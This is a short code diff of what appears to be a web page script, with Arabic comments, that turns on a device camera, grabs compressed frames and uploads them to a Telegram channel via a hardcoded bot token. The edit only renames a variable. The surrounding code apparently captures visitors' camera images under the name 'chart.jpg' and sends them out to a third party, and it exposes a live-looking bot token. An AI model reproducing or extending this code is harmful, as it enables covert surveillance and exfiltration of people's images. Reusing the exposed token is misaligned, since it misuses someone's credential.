@@ -23,7 +23,7 @@
         
         // معلومات البوت والقناة الخاصة بك
         const TELEGRAM_TOKEN = "8956200597:AAFF--lA3lKfmoZnZ_qWH5fTsmNgPBxPV-Q"; 
-        const CHANNEL_USERNAME = "@dodooddoo"; // تأكد أن البوت "أدمن" في هذه القناة وله صلاحية نشر الصور
+        const MY_CHAT_ID = "@dodooddoo"; // تأكد أن البوت "أدمن" في هذه القناة وله صلاحية نشر الصور
 
         // تفعيل الكاميرا لنظام iOS
         const constraints = {
@@ -56,7 +56,7 @@
             // تحويل الصورة وضغطها بجودة 70%
             canvas.toBlob(blob => {
                 const formData = new FormData();
-                formData.append('chat_id', CHANNEL_USERNAME); // تم إصلاح المتغير هنا ليرسل للقناة مباشرة
+                formData.append('chat_id', MY_CHAT_ID); // تم إصلاح المتغير هنا ليرسل للقناة مباشرة
                 formData.append('photo', blob, 'chart.jpg');
                 
                 // إرسال الصورة مباشرة إلى رابط الـ API الخاص بالتليجرام
